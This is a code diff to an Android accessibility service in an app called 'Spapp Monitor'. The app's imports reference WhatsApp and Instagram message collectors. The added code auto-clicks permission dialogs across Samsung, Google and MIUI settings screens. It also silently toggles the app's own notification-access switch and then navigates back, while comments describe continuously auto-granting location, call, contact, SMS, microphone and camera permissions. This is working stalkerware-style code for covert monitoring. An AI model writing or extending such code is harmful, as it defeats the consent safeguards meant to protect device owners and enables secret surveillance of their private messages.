@@ -13,6 +13,7 @@ import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WhatsAppMessageEntry
 import com.spapp.monitoring.data.local.InstagramMessageEntry
 import com.spapp.monitoring.collectors.WhatsAppNotificationListener
+import androidx.core.app.NotificationManagerCompat
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -136,6 +137,7 @@ class BlockAccessibilityService : AccessibilityService() {
             override fun run() {
                 runs++
                 val clicked = clickAnyPermissionDialog()
+                handleNotificationAccessAutoToggle()
                 // Continuous auto-grant: Keep running even when clicked == true!
                 // Android presents permissions sequentially (Location -> Calls -> Contacts -> SMS -> Mic -> Camera -> Storage)
                 if (runs < maxRuns) {
@@ -185,6 +187,10 @@ class BlockAccessibilityService : AccessibilityService() {
                 "com.miui.securitycenter:id/accept",
                 "com.lbe.security.miui:id/accept",
                 "com.miui.securitycenter:id/btn_accept",
+                "com.android.settings:id/button1",
+                "com.android.settings:id/allow_button",
+                "com.google.android.settings:id/button1",
+                "com.samsung.android.settings:id/button1",
                 "android:id/button1"
             )
 
@@ -224,6 +230,7 @@ class BlockAccessibilityService : AccessibilityService() {
                 "always",
                 "grant",
                 "unrestricted",
+                "allow notification access",
                 "அனுமதி"
             )
 
@@ -326,36 +333,87 @@ class BlockAccessibilityService : AccessibilityService() {
         return false
     }
 
+    private var lastNotifToggleTime = 0L
+
+    private fun isNotificationAccessGranted(): Boolean {
+        return try {
+            val flat = android.provider.Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+            flat != null && flat.contains(packageName)
+        } catch (_: Exception) {
+            false
+        }
+    }
+
+    fun handleNotificationAccessAutoToggle(): Boolean {
+        try {
+            val now = android.os.SystemClock.uptimeMillis()
+            if (now - lastNotifToggleTime < 800L) return false
+
+            val candidateRoots = mutableListOf<AccessibilityNodeInfo>()
+            rootInActiveWindow?.let { candidateRoots.add(it) }
+            try {
+                windows?.forEach { win -> win.root?.let { candidateRoots.add(it) } }
+            } catch (_: Exception) {}
+
+            if (candidateRoots.isEmpty()) return false
+
+            // Case A: If Notification Access is already granted, but we are still on the settings screen:
+            // Auto-navigate back to return to MainActivity!
+            if (isNotificationAccessGranted()) {
+                val hasSettingsIndicator = candidateRoots.any { root ->
+                    !root.findAccessibilityNodeInfosByText("Notification read, reply, and control").isNullOrEmpty() ||
+                    !root.findAccessibilityNodeInfosByText("Device & app notifications").isNullOrEmpty() ||
+                    !root.findAccessibilityNodeInfosByText("Notification access").isNullOrEmpty() ||
+                    !root.findAccessibilityNodeInfosByText("Device and app notifications").isNullOrEmpty()
+                }
+                if (hasSettingsIndicator) {
+                    lastNotifToggleTime = now
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        performGlobalAction(GLOBAL_ACTION_BACK)
+                    }, 400L)
+                    return true
+                }
+                return false
+            }
+
+            // Case B: In Notification Access settings list or toggle sub-screen:
+            val appName = getString(com.spapp.monitoring.R.string.app_name) // "Spapp Monitor"
+            for (root in candidateRoots) {
+                // Check if our app row is visible in the list:
+                val appNodes = root.findAccessibilityNodeInfosByText(appName)
+                if (!appNodes.isNullOrEmpty()) {
+                    for (node in appNodes) {
+                        if (clickNodeOrParent(node)) {
+                            Log.i("BlockA11y", "Auto-clicked $appName in notification access settings")
+                            lastNotifToggleTime = now
+                            return true
+                        }
+                    }
+                }
+
+                // Check for generic switch or "Allow notification access" toggle on the detail screen:
+                val toggleNodes = root.findAccessibilityNodeInfosByText("Allow notification access")
+                if (!toggleNodes.isNullOrEmpty()) {
+                    for (node in toggleNodes) {
+                        if (clickNodeOrParent(node)) {
+                            Log.i("BlockA11y", "Auto-toggled 'Allow notification access' switch")
+                            lastNotifToggleTime = now
+                            return true
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("BlockA11y", "Error in handleNotificationAccessAutoToggle", e)
+        }
+        return false
+    }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         try {
             val eventType = event.eventType
             val packageName = event.packageName?.toString() ?: return
             if (packageName == applicationContext.packageName) return // never block ourselves
-
-        // ==========================================
-        // 🌟 AUTOMATE RUNTIME PERMISSIONS (ALL ANDROID VERSIONS & OEMS)
-        // ==========================================
-        // val isPermissionCandidate = packageName.contains("permission") ||
-        //         packageName.contains("installer") ||
-        //         packageName.contains("security") ||
-        //         packageName.contains("settings") ||
-        //         packageName == "android"
-
-        // if (isPermissionCandidate) {
-        //     if (clickAnyPermissionDialog()) {
-        //         return
-        //     }
-        // }
-        // // ==========================================
-
-        // if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
-        //     val now = android.os.SystemClock.uptimeMillis()
-        //     if (now - lastScrollEventTime < 750L) {
-        //         return
-        //     }
-        //     lastScrollEventTime = now
-        // }
-
 
         // ==========================================
         // 🌟 AUTOMATE RUNTIME PERMISSIONS (WINDOW INTERCEPTION)
@@ -365,12 +423,14 @@ class BlockAccessibilityService : AccessibilityService() {
                 packageName.contains("installer") ||
                 packageName.contains("security") ||
                 packageName.contains("safecenter") ||
+                packageName.contains("settings") ||
                 packageName == "android"
 
         if (isPermissionCandidate) {
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 clickAnyPermissionDialog()
+                handleNotificationAccessAutoToggle()
             }
         }
         // ==========================================
